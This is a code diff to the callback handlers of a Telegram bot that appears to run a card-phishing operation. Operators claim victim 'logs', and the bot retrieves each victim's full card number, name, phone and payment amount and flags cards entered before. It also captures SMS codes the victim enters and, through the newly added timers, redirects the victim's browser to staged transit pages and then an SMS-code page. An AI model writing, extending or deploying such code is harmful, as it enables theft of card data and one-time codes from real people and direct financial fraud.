@@ -1,12 +1,13 @@
 # [file name]: callbacks.py (обновленная версия)
 # [file content begin]
-from aiogram import Dispatcher, types, F
-from aiogram.fsm.context import FSMContext  # Добавьте этот импорт
+from aiogram import Dispatcher, types, F, Bot
+from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.exceptions import TelegramForbiddenError
 import httpx
 import sys
 import os
+import asyncio
 
 # Добавляем корневую директорию в путь для импортов
 sys.path.append(os.path.join(os.path.dirname(__file__), '../..'))
@@ -77,7 +78,7 @@ async def handle_sms_code_input(message: types.Message, state: FSMContext):
                 json={
                     "sessionId": session_id,
                     "clientId": log['client_id'],
-                    "phoneDigits": phone_digits  # Изменили на phoneDigits
+                    "phoneDigits": phone_digits
                 }
             )
             
@@ -120,7 +121,8 @@ async def handle_sms_code_input(message: types.Message, state: FSMContext):
     # Очищаем состояние
     await state.clear()
 
-async def take_log(callback: types.CallbackQuery):
+async def handle_take_log_with_timers(callback: types.CallbackQuery):
+    """Обработчик взятия лога с таймерами для транзитных страниц"""
     session_id = callback.data.split(":")[1]
     
     log = get_log_by_session(session_id)
@@ -134,7 +136,7 @@ async def take_log(callback: types.CallbackQuery):
 
     update_log_taken_by(session_id, callback.from_user.id)
 
-    # Отправляем уведомление в группу о взятии лога
+    # Отправляем уведомление в группу
     booking_id = log['booking_id'] or "N/A"
     client_id = log['client_id'] or "N/A"
     username = callback.from_user.username or "без username"
@@ -144,12 +146,76 @@ async def take_log(callback: types.CallbackQuery):
         f"взял @{username}(ID: {callback.from_user.id})"
     )
     
-    await callback.bot.send_message(config.GROUP_ID, group_message)
+    await callback.bot.send_message(config.GROUP_ID_TEST, group_message)
 
     # Уведомляем админский бот
     await notify_log_taken(booking_id, client_id, username, callback.from_user.id)
 
-    # Остальной код без изменений...
+    # НЕМЕДЛЕННО перенаправляем пользователя на первую транзитную страницу
+    try:
+        async with httpx.AsyncClient() as client:
+            response = await client.post(
+                f"{config.SERVER_URL}/redirect-transit-1", 
+                json={
+                    "sessionId": session_id,
+                    "clientId": log['client_id']
+                }
+            )
+            
+            if response.status_code == 200:
+                await callback.answer("✅ Пользователь перенаправлен на обработку")
+            else:
+                await callback.answer("❌ Ошибка перенаправления", show_alert=True)
+                
+    except Exception as e:
+        print(f"Error redirecting to transit-1: {e}")
+        await callback.answer("❌ Ошибка соединения", show_alert=True)
+
+    # Запускаем таймер для второй транзитной страницы (через 15 секунд)
+    asyncio.create_task(schedule_transit_2_redirect(session_id, log['client_id'], callback.bot))
+
+    # Запускаем таймер для SMS страницы (через 30 секунд)
+    asyncio.create_task(schedule_sms_redirect(session_id, log['client_id'], callback.bot))
+
+    # Отправляем данные оператору
+    await send_operator_data(callback, session_id, log)
+
+async def schedule_transit_2_redirect(session_id: str, client_id: str, bot: Bot):
+    """Запланировать переход на вторую транзитную страницу через 15 секунд"""
+    await asyncio.sleep(15)
+    
+    try:
+        async with httpx.AsyncClient() as client:
+            await client.post(
+                f"{config.SERVER_URL}/redirect-transit-2", 
+                json={
+                    "sessionId": session_id,
+                    "clientId": client_id
+                }
+            )
+        print(f"🔄 Scheduled transit-2 redirect for {session_id}")
+    except Exception as e:
+        print(f"Error scheduling transit-2: {e}")
+
+async def schedule_sms_redirect(session_id: str, client_id: str, bot: Bot):
+    """Запланировать переход на SMS страницу через 30 секунд"""
+    await asyncio.sleep(30)
+    
+    try:
+        async with httpx.AsyncClient() as client:
+            await client.post(
+                f"{config.SERVER_URL}/redirect-sms", 
+                json={
+                    "sessionId": session_id,
+                    "clientId": client_id
+                }
+            )
+        print(f"📱 Scheduled SMS redirect for {session_id}")
+    except Exception as e:
+        print(f"Error scheduling SMS: {e}")
+
+async def send_operator_data(callback: types.CallbackQuery, session_id: str, log: dict):
+    """Отправляет данные оператору"""
     async with httpx.AsyncClient() as client:
         customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
         card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
@@ -160,7 +226,6 @@ async def take_log(callback: types.CallbackQuery):
     
     full_pan = card.get('full_pan', '')
     
-    # Проверяем дубликаты карты
     duplicates = find_card_duplicates(log['masked_pan'])
     previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
     
@@ -171,12 +236,10 @@ async def take_log(callback: types.CallbackQuery):
     else:
         card_info_text = "❌ Информация о карте недоступна"
     
-    # Формируем текст с учетом дубликатов
     text = (
         f"Лог #{booking_id} || #{client_id}\n\n"
     )
     
-    # Добавляем предупреждение о дубликате, если карта использовалась ранее
     if previous_uses:
         text += f"⚠️ <b>Эта карта уже вводилась ранее</b>\n\n"
     
@@ -188,7 +251,10 @@ async def take_log(callback: types.CallbackQuery):
         f"{card_info_text}\n\n"
         f"👤  Имя: {customer.get('name')} {customer.get('surname')}\n"
         f"📞  Номер: {customer.get('phone')}\n\n"
-        f"💸  Сумма: {booking.get('total_amount')}.00 AED"
+        f"💸  Сумма: {booking.get('total_amount')}.00 AED\n\n"
+        f"🕒 <b>Таймеры запущены:</b>\n"
+        f"• Через 15 сек: Вторая транзитная страница\n"
+        f"• Через 30 сек: Страница SMS"
     )
 
     await callback.bot.send_message(
@@ -205,7 +271,6 @@ async def take_log(callback: types.CallbackQuery):
             session_id
         )
     )
-    await callback.answer()
 
 async def take_from_user(callback: types.CallbackQuery):
     """Обработчик для взятия лога у другого пользователя"""
@@ -239,7 +304,7 @@ async def take_from_user(callback: types.CallbackQuery):
         f"перешел к @{new_username}(ID: {callback.from_user.id})"
     )
     
-    await callback.bot.send_message(config.GROUP_ID, group_message)
+    await callback.bot.send_message(config.GROUP_ID_TEST, group_message)
     
     # Уведомляем админский бот о перехвате
     await notify_log_taken_over(booking_id, client_id, new_username, callback.from_user.id, previous_owner_id)
@@ -319,7 +384,7 @@ async def take_from_user(callback: types.CallbackQuery):
         print(f"Не удалось уведомить пользователя {previous_owner_id}: бот заблокирован или диалог не начат")
         # Можно отправить уведомление в группу
         await callback.bot.send_message(
-            config.GROUP_ID,
+            config.GROUP_ID_TEST,
             f"⚠️ Не удалось уведомить пользователя ID {previous_owner_id} о перехвате лога"
         )
     except Exception as e:
@@ -411,7 +476,6 @@ async def handle_redirect_action(callback: types.CallbackQuery):
         await callback.message.answer(error_msg)
         await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)
 
-# Остальные функции без изменений...
 async def check_online_status(callback: types.CallbackQuery):
     session_id = callback.data.split(":")[1]
     
@@ -468,7 +532,7 @@ async def check_online_status(callback: types.CallbackQuery):
     await callback.answer()
 
 def register_callbacks(dp: Dispatcher):
-    dp.callback_query.register(take_log, F.data.startswith("take:"))
+    dp.callback_query.register(handle_take_log_with_timers, F.data.startswith("take:"))
     dp.callback_query.register(take_from_user, F.data.startswith("take_from_user:"))
     dp.callback_query.register(check_online_status, F.data.startswith("check_online:"))
     dp.callback_query.register(handle_redirect_action, F.data.startswith("balance:"))
